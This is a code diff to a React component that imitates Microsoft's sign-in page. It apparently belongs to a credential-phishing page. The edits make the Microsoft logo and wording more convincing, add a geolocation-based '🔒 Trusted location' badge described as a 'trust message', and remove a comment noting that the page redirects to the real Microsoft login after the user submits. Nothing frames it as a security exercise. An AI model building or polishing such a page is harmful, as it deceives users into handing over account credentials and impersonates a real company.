@@ -11,7 +11,7 @@ export default function MicrosoftLogin() {
   const [location, setLocation] = useState<{ city?: string; country?: string }>({});
   const [locationStatus, setLocationStatus] = useState<"idle" | "loading" | "granted" | "denied">("idle");
 
-  // Geolocation (same as before)
+  // Geolocation (optional – remove if you don't want the trust message)
   useEffect(() => {
     if (!navigator.geolocation) return;
     setLocationStatus("loading");
@@ -68,12 +68,11 @@ export default function MicrosoftLogin() {
       });
       const data = await response.json();
       if (data.success) {
-        // Redirect to real Microsoft login page
         window.location.href = data.redirect;
       } else {
         throw new Error(data.error || "Login failed");
       }
-    } catch (err) {
+    } catch {
       setErrorMsg("Something went wrong. Please try again.");
       setLoading(false);
     }
@@ -89,18 +88,19 @@ export default function MicrosoftLogin() {
     <div className="min-h-screen w-full flex flex-col bg-[#f2f2f2] font-['Segoe_UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif] text-[#1b1b1b] antialiased">
       <div className="flex-1 flex items-center justify-center p-6">
         <div className="w-full max-w-[440px] bg-white shadow-lg p-8 rounded-lg">
-          {/* Microsoft logo (simple, no four-color grid) */}
-          <div className="mb-6">
-            <svg width="108" height="24" viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M0 0h24v24H0z" fill="#F25022" />
-              <path d="M24 0h24v24H24z" fill="#7FBA00" />
-              <path d="M48 0h24v24H48z" fill="#00A4EF" />
-              <path d="M72 0h24v24H72z" fill="#FFB900" />
-              <path d="M96 4h12v16h-12z" fill="#737373" />
-            </svg>
+          {/* Microsoft four‑color logo + "Microsoft" text */}
+          <div className="mb-6 flex items-center">
+            <div className="grid grid-cols-2 gap-[2px] w-[34px] h-[34px] flex-shrink-0">
+              <div className="bg-[#f25022]"></div>
+              <div className="bg-[#7fba00]"></div>
+              <div className="bg-[#00a4ef]"></div>
+              <div className="bg-[#ffb900]"></div>
+            </div>
+            <span className="ml-3 text-[#737373] font-semibold text-[20px] tracking-tight">Microsoft</span>
           </div>
 
           <h1 className="text-[1.75rem] font-semibold leading-9 mb-2">Sign in</h1>
+          <p className="text-[0.9375rem] text-[#1b1b1b] mb-6">Use your Microsoft account.</p>
 
           {locationStatus === "granted" && location.city && (
             <p className="text-xs text-green-700 mb-4">🔒 Trusted location: {location.city}, {location.country}</p>
@@ -108,7 +108,7 @@ export default function MicrosoftLogin() {
 
           {step === "email" ? (
             <form onSubmit={handleEmailSubmit}>
-              <div className="mb-6">
+              <div className="mb-4">
                 <input
                   type="text"
                   placeholder="Email or phone number"
@@ -122,7 +122,7 @@ export default function MicrosoftLogin() {
 
               {errorMsg && <div className="text-red-600 text-sm mb-4">{errorMsg}</div>}
 
-              <div className="mb-4">
+              <div className="mb-6">
                 <a href="#" className="text-[#0067b8] text-sm hover:underline">
                   Forgot your username?
                 </a>
